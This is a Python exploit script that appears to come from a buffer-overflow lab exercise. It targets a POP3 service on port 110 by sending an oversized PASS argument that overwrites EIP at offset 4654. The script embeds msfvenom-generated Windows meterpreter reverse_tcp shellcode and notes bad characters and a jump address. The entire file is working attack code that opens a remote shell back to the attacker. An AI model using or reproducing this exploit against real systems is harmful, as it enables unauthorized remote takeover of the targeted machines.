import sys
import socket

## Okay boys, the bad chars detected are: 0x00 0x0a 0x0d
## the jump address will be 0x7608bce1

#msfvenom -p windows/meterpreter/reverse_tcp LHOST=MYIP LPORT=MYPORT -e x86/shikata_ga_nai -f py
shellcode =  ""
shellcode += "\xd9\xe5\xbd\xbf\x23\x46\x7e\xd9\x74\x24\xf4\x5e\x2b"
shellcode += "\xc9\xb1\x56\x83\xee\xfc\x31\x6e\x14\x03\x6e\xab\xc1"
shellcode += "\xb3\x82\x3b\x87\x3c\x7b\xbb\xe8\xb5\x9e\x8a\x28\xa1"
shellcode += "\xeb\xbc\x98\xa1\xbe\x30\x52\xe7\x2a\xc3\x16\x20\x5c"
shellcode += "\x64\x9c\x16\x53\x75\x8d\x6b\xf2\xf5\xcc\xbf\xd4\xc4"
shellcode += "\x1e\xb2\x15\x01\x42\x3f\x47\xda\x08\x92\x78\x6f\x44"
shellcode += "\x2f\xf2\x23\x48\x37\xe7\xf3\x6b\x16\xb6\x88\x35\xb8"
shellcode += "\x38\x5d\x4e\xf1\x22\x82\x6b\x4b\xd8\x70\x07\x4a\x08"
shellcode += "\x49\xe8\xe1\x75\x66\x1b\xfb\xb2\x40\xc4\x8e\xca\xb3"
shellcode += "\x79\x89\x08\xce\xa5\x1c\x8b\x68\x2d\x86\x77\x89\xe2"
shellcode += "\x51\xf3\x85\x4f\x15\x5b\x89\x4e\xfa\xd7\xb5\xdb\xfd"
shellcode += "\x37\x3c\x9f\xd9\x93\x65\x7b\x43\x85\xc3\x2a\x7c\xd5"
shellcode += "\xac\x93\xd8\x9d\x40\xc7\x50\xfc\x0c\x24\x59\xff\xcc"
shellcode += "\x22\xea\x8c\xfe\xed\x40\x1b\xb2\x66\x4f\xdc\xc3\x61"
shellcode += "\x70\x32\x6b\xe1\x8e\xb3\x8b\x2b\x55\xe7\xdb\x43\x7c"
shellcode += "\x88\xb0\x93\x81\x5d\x2c\x9e\x15\x9e\x18\x9e\x92\x76"
shellcode += "\x5a\x9f\x4d\xdb\xd3\x79\x3d\xb3\xb3\xd5\xfe\x63\x73"
shellcode += "\x86\x96\x69\x7c\xf9\x87\x91\x57\x92\x22\x7e\x01\xca"
shellcode += "\xda\xe7\x08\x80\x7b\xe7\x87\xec\xbc\x63\x2d\x10\x72"
shellcode += "\x84\x44\x02\x63\xf3\xa6\xda\x74\x96\xa6\xb0\x70\x30"
shellcode += "\xf1\x2c\x7b\x65\x35\xf3\x84\x40\x46\xf4\x7b\x15\x7e"
shellcode += "\x8e\x4a\x83\x3e\xf8\xb2\x43\xbe\xf8\xe4\x09\xbe\x90"
shellcode += "\x50\x6a\xed\x85\x9e\xa7\x82\x15\x0b\x48\xf2\xca\x9c"
shellcode += "\x20\xf8\x35\xea\xee\x03\x10\x68\xe8\xfb\xe6\x47\x51"
shellcode += "\x93\x18\xd8\x61\x63\x73\xd8\x31\x0b\x88\xf7\xbe\xfb"
shellcode += "\x71\xd2\x96\x93\xf8\xb3\x55\x02\xfc\x99\x38\x9a\xfd"
shellcode += "\x2e\xe1\x2d\x87\x5f\x16\xce\x78\x76\x73\xcf\x78\x76"
shellcode += "\x85\xec\xae\x4f\xf3\x33\x73\xf4\x0c\x06\xd6\x5d\x87"
shellcode += "\x68\x44\x9d\x82"


# Some points, the EIP offset found is 4654
# ESP is offset 4658

eip = '\xe1\xbc\x08\x76'
move_esp = "\x81\xc4\xc0\xfd\xff\xff" # add esp, -240h
buff_size=6000
buff = 'A'*4654
buff += eip
buff += move_esp
buff += shellcode
buff += 'C'*(buff_size - len(buff))

HOST = '192.168.0.133'
PORT = 110
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	s.connect((HOST,PORT))
except:
	print("Couldn't connect to IP")

print("Sending Evil buffer...")
data = s.recv(1024)
s.send('USER username'+'\r\n')
data = s.recv(1024)
s.send('PASS ' + buff + '\r\n')
s.close()
print("Closed connection")


